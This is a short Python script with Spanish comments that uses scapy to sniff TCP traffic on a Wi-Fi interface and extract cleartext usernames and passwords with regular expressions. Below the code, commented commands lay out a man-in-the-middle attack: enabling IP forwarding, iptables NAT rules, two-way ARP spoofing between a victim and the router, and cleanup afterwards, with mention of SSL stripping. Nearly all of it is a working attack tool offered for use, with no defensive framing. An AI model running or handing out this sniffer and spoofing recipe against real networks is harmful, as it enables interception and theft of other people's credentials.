# pip install scapy
from scapy.all import sniff
import re

def analizar(paquete):
    # Verificar si el paquete tiene una capa 'Raw' (datos sin procesar)
    if paquete.haslayer("Raw"):
        carga = paquete["Raw"].load.decode(errors="ignore")
        carga_lower = carga.lower()

        keywords = [
            "user","username","email","mail","login","pass","password","pwd"
        ]

        if any(keyword in carga_lower for keyword in keywords):
            credenciales_encontradas = []

            patrones = [
                r"(user(?:name)?|login|pass(?:word)?|pwd)\s*[:=]\s*([^\s&<>\"']{3,40})",
                r"(?i)^(USER|PASS)\s+([^\r\n]{1,50})"
            ]

            for patron in patrones:
                matches = re.findall(patron, carga, re.I)

                for clave, valor in matches:
                    if (
                        valor.lower() not in ["login", "user", "username", "pwd"]
                        and not re.search(r"<[^>]+>", valor)
                    ):
                        credenciales_encontradas.append(f"{clave.strip()} = {valor.strip()}")
            
            if credenciales_encontradas:
                print("[!] Credenciales detectadas")
                for creds in credenciales_encontradas:
                    print(f" -> {creds}")

sniff( filter="tcp", prn=analizar, store=0, iface="wlo1")

# Para ataques dirigidos MITM, realizaremos un arpspoofing
# primero activar el ip_forwarding
# sudo sysctl -w net.ipv4.ip_forward=1

# Añadir reglas de iptables para NAT y FORWARDING

# Habilita NAT (enmascaramiento) en la interfaz wlo1 (típicamente la interfaz Wi-Fi del atacante).
# Reescribe la dirección IP de origen de los paquetes que salen por wlo1, reemplazándola por la IP del atacante.
# sudo iptables -t nat -A POSTROUTING -o wlo1 -j MASQUERADE

# Permite reenvío de tráfico interceptado.
# sudo iptables -A FORWARD -i wlo1 -o wlo1 -j ACCEPT

# sudo arpspoof -i wlo1 -t 192.168.1.254 192.168.1.1

# El router también guarda una tabla ARP:
# - En algunos entornos, si el router intenta enviar algo directamente a la víctima (sin pasar por ti), no funcionará el MITM completo.
# - Evitas que la víctima y el router se comuniquen directamente:
#   - Al ejecutar ambas direcciones, te aseguras de que todo el tráfico pase por ti en ambas direcciones.
#   - En algunos ataques activos (como inyección, modificación o SSL stripping), la respuesta del router también necesita pasar por ti, y no solo el request del cliente.
# sudo arpspoof -i wlo1 -t 192.168.1.1 192.168.1.254

# Al terminar ataque
# sudo sysctl -w net.ipv4.ip_forward=0
# sudo iptables -t nat -F
# sudo iptables -F 
# sudo systemctl restart NetworkManager
